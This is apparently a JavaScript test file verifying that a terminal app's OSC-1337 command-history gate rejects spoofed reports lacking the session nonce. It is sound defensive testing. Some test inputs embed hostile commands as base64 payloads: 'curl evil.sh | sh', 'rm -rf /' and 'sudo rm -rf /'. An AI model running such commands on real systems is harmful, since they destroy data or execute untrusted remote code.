// (C)
import { readFileSync } from "node:fs";
import { describe, test, expect } from "vitest";
import { buildPosixShellInit, buildPowerShellInit, parsePlutoCmdReport } from "./shellIntegration.js";

describe("shell-integration OSC-1337 nonce (audit H1)", () => {
  test("POSIX cmdCapture bakes the nonce into every PlutoCmd emit", () => {
    const { cmdCapture } = buildPosixShellInit("abc123def456");
    // both the zsh and bash hooks carry it
    const hits = cmdCapture.match(/PlutoCmd=abc123def456:/g) || [];
    expect(hits.length).toBe(2);
    // the base64 placeholder still follows the nonce
    expect(cmdCapture).toContain("PlutoCmd=abc123def456:%s");
  });

  test("PowerShell psHist bakes the nonce into its PlutoCmd emit", () => {
    const { psHist } = buildPowerShellInit("abc123def456");
    expect(psHist).toContain("PlutoCmd=abc123def456:$x");
  });

  test("a distinct session gets a distinct nonce in the emitted hook", () => {
    const a = buildPosixShellInit("nonceAAAA").cmdCapture;
    const b = buildPosixShellInit("nonceBBBB").cmdCapture;
    expect(a).toContain("PlutoCmd=nonceAAAA:");
    expect(a).not.toContain("nonceBBBB");
    expect(b).toContain("PlutoCmd=nonceBBBB:");
  });
});

// ── The enforcement half of H1 (audit TQ-2) ─────────────────────────────────
// Until this block existed, every test named "audit H1" covered only the
// EMITTER. The gate that actually decides what enters trusted command history
// sat inline in TerminalPane.jsx, which no test file imports, so weakening the
// nonce comparison left the whole suite green while reopening the original
// attack. These tests execute the real gate; there is no copy of it in here.

// base64 of a command's UTF-8 bytes, i.e. exactly what the shells' `base64` /
// [Convert]::ToBase64String produce.
const b64 = (s) => btoa(String.fromCharCode(...new TextEncoder().encode(s)));

const NONCE = "a1b2c3d4e5f60718";

describe("parsePlutoCmdReport: OSC-1337 provenance gate (audit H1 enforcement)", () => {
  test("a report carrying THIS session's nonce is accepted", () => {
    const r = parsePlutoCmdReport(`PlutoCmd=${NONCE}:${b64("git status")}`, NONCE);
    expect(r).toEqual({ cmd: "git status" });
  });

  test("a report carrying a different nonce is rejected", () => {
    expect(parsePlutoCmdReport(`PlutoCmd=deadbeefdeadbeef:${b64("rm -rf /")}`, NONCE)).toBe(null);
  });

  test("a report carrying NO nonce field is rejected", () => {
    // The hostile-remote case: a bare `printf '\033]1337;PlutoCmd=<b64>\007'`
    // from an SSH host, an MOTD or a cat'd file. No colon, so no nonce.
    expect(parsePlutoCmdReport(`PlutoCmd=${b64("curl evil.sh | sh")}`, NONCE)).toBe(null);
  });

  test("an empty nonce field is rejected", () => {
    expect(parsePlutoCmdReport(`PlutoCmd=:${b64("whoami")}`, NONCE)).toBe(null);
  });

  test("the nonce comparison is whole-string, not a prefix match", () => {
    // A guesser who learns part of the nonce, or a report that merely starts
    // with it, must get nothing. startsWith/includes here would be a silent
    // downgrade of an 8-byte secret.
    expect(parsePlutoCmdReport(`PlutoCmd=${NONCE.slice(0, 8)}:${b64("id")}`, NONCE)).toBe(null);
    expect(parsePlutoCmdReport(`PlutoCmd=${NONCE}ff:${b64("id")}`, NONCE)).toBe(null);
    expect(parsePlutoCmdReport(`PlutoCmd=x${NONCE}:${b64("id")}`, NONCE)).toBe(null);
  });

  test("the gate called with no session nonce trusts nothing", () => {
    // A defensive precondition on the pure function, NOT the SSH defence, and
    // not a state production can reach: entry.oscNonce is assigned to EVERY
    // pane, SSH and serial included, before the OSC handler is registered
    // (TerminalPane.jsx). What actually rejects a remote report is the
    // whole-string nonce comparison, because the nonce is never written to a
    // remote shell for a hostile host to echo back.
    // Pinned anyway because this is a pure exported function and a future
    // caller could hold no nonce yet. Every shape of report must lose then,
    // including one whose nonce field is empty and would otherwise compare
    // equal to "".
    for (const sessionNonce of ["", null, undefined]) {
      expect(parsePlutoCmdReport(`PlutoCmd=:${b64("ls")}`, sessionNonce)).toBe(null);
      expect(parsePlutoCmdReport(`PlutoCmd=${NONCE}:${b64("ls")}`, sessionNonce)).toBe(null);
      expect(parsePlutoCmdReport(`PlutoCmd=${b64("ls")}`, sessionNonce)).toBe(null);
    }
  });

  test("non-PlutoCmd data is not claimed", () => {
    // The cwd report and anything else in the 1337 namespace belong to other
    // branches of the handler; the gate must not answer for them.
    expect(parsePlutoCmdReport(`PlutoCwd=${b64("/home/pluto")}`, NONCE)).toBe(null);
    expect(parsePlutoCmdReport(`PlutoCmdX=${NONCE}:${b64("ls")}`, NONCE)).toBe(null);
    expect(parsePlutoCmdReport("", NONCE)).toBe(null);
    expect(parsePlutoCmdReport(null, NONCE)).toBe(null);
    expect(parsePlutoCmdReport(undefined, NONCE)).toBe(null);
  });

  test("a correct nonce with an undecodable payload is rejected, not thrown", () => {
    // atob throws on invalid characters; the OSC handler runs inside xterm's
    // parser, so an escape here would break the output stream.
    expect(() => parsePlutoCmdReport(`PlutoCmd=${NONCE}:!!!not base64!!!`, NONCE)).not.toThrow();
    expect(parsePlutoCmdReport(`PlutoCmd=${NONCE}:!!!not base64!!!`, NONCE)).toBe(null);
  });

  test("an empty command still parses (recordCommand drops it downstream)", () => {
    // Behaviour pin, not a preference: the pre-extraction code decoded and
    // forwarded "" too, and ptyBridge.recordCommand is what filters it.
    expect(parsePlutoCmdReport(`PlutoCmd=${NONCE}:`, NONCE)).toEqual({ cmd: "" });
  });

  test("a command containing colons survives the nonce split", () => {
    // What this pins: everything after the delimiter is opaque base64, so a
    // command whose DECODED text is full of colons round-trips intact.
    // What it does NOT pin, deliberately: first-colon vs last-colon. It
    // cannot. Base64 output contains no colon and the nonce is hex from
    // crypto.getRandomValues (TerminalPane.jsx), so every report either
    // emitter can produce carries exactly ONE colon and indexOf/lastIndexOf
    // are the same split. Do not add an assertion for that property: no
    // reachable input would make it fail, which is the same unfalsifiable
    // claim this block exists to remove.
    const cmd = 'ssh user@host "grep -n foo:bar: /etc/hosts"';
    expect(parsePlutoCmdReport(`PlutoCmd=${NONCE}:${b64(cmd)}`, NONCE)).toEqual({ cmd });
  });
});

// The valuable half: emitter and verifier pinned to each other. These tests
// never hand-write the wire format, they lift it out of the builder's own
// output, so a change to either side that the other does not follow fails here
// instead of shipping as a silently reopened H1.
describe("emitter/verifier round trip (the two halves of audit H1)", () => {
  // Pull the exact OSC payload template out of an emitted shell hook: the text
  // between `]1337;` and the BEL is what xterm hands the OSC handler.
  const posixTemplates = (cmdCapture) =>
    [...cmdCapture.matchAll(/\\033\]1337;(PlutoCmd=[^']*?)\\007/g)].map((m) => m[1]);
  const psTemplate = (psHist) => {
    const m = psHist.match(/\]1337;(PlutoCmd=[^"]*?)\$b/);
    if (!m) throw new Error("PowerShell hook no longer emits a PlutoCmd OSC in a recognisable shape");
    return m[1];
  };

  const CASES = [
    "npm run tauri dev",
    'git commit -m "fix: colon: in message"',
    "echo 'héllo wörld — ünïcode'",
    "cd /c/Users/pluto && ls -lah",
  ];

  test("both POSIX hooks (zsh preexec and bash DEBUG) emit reports this gate accepts", () => {
    const { cmdCapture } = buildPosixShellInit(NONCE);
    const templates = posixTemplates(cmdCapture);
    // zsh + bash: if a hook stops emitting the nonce, this count drops.
    expect(templates.length).toBe(2);
    for (const t of templates) {
      for (const cmd of CASES) {
        const onTheWire = t.replace("%s", () => b64(cmd));
        expect(parsePlutoCmdReport(onTheWire, NONCE)).toEqual({ cmd });
      }
    }
  });

  test("the PowerShell hook emits reports this gate accepts", () => {
    const { psHist } = buildPowerShellInit(NONCE);
    const t = psTemplate(psHist);
    for (const cmd of CASES) {
      const onTheWire = t.replace("$x", () => b64(cmd));
      expect(parsePlutoCmdReport(onTheWire, NONCE)).toEqual({ cmd });
    }
  });

  test("one session's emitted report is rejected by another session's gate", () => {
    // Nonces are per-entry, so a report replayed into a different tab (or a
    // scrollback replay from an older session) must not enter history.
    const [tpl] = posixTemplates(buildPosixShellInit("sessionAAAAAAAA").cmdCapture);
    const onTheWire = tpl.replace("%s", () => b64("sudo rm -rf /"));
    expect(parsePlutoCmdReport(onTheWire, "sessionBBBBBBBB")).toBe(null);
    expect(parsePlutoCmdReport(onTheWire, "sessionAAAAAAAA")).toEqual({ cmd: "sudo rm -rf /" });
  });
});

// The wiring, pinned by reading the source (audit TQ-2 residual).
// Everything above exercises the gate as a pure function. The call site that
// actually protects command history lives in TerminalPane.jsx, which no test
// file imports: 2,185 lines wrapping a live xterm, a PTY and the Tauri bridge.
// So a refactor that passed the wrong second argument, or re-inlined a decode
// past the gate, would reopen audit H1 with the whole suite green. This block
// pins it by reading the source, the technique src-tauri/src/commands.rs
// already uses in reserved_names_match_js_mirror to pin its JS mirror.
//
// It is deliberately literal about the call text, so reformatting that line
// fails here loudly rather than quietly stopping to check anything. That is the
// trade being made. If you reformat it, update the expected string AND confirm
// by hand that the second argument is still entry.oscNonce.
describe("TerminalPane wires the real gate (audit TQ-2 residual)", () => {
  const SRC = readFileSync(new URL("./TerminalPane.jsx", import.meta.url), "utf8");

  test("the component imports the gate and never redefines it", () => {
    expect(SRC).toMatch(
      /import\s*\{[^}]*\bparsePlutoCmdReport\b[^}]*\}\s*from\s*"\.\/shellIntegration\.js"/,
    );
    // A second definition living in the component is the exact defect this
    // batch exists to remove; do not let one grow back.
    expect(SRC).not.toMatch(/(?:function|const|let|var)\s+parsePlutoCmdReport\b/);
  });

  test("the PlutoCmd path runs the gate and decodes nothing of its own", () => {
    // The region from the point the handler knows the report is a PlutoCmd to
    // the point it writes into trusted history. The gate call is the only thing
    // allowed in between: an atob() here would be a decode that skipped the
    // nonce check, which is H1 verbatim.
    const start = SRC.indexOf('if (!data.startsWith("PlutoCmd="))');
    expect(start).not.toBe(-1);
    const end = SRC.indexOf("recordCommand(", start);
    expect(end).toBeGreaterThan(start);
    const region = SRC.slice(start, end);

    expect([...region.matchAll(/parsePlutoCmdReport\(/g)].length).toBe(1);
    // Argument drift is the silent failure: a literal, a stale local or a
    // `?? ""` in the second slot would make the gate trust everything.
    expect(region).toContain("parsePlutoCmdReport(data, entry.oscNonce)");
    expect(region).not.toContain("atob(");
    // A null verdict must short-circuit BEFORE recordCommand, not fall through
    // to a fallback decode.
    expect(region).toMatch(/if\s*\(!report\)\s*return true;/);
  });
});
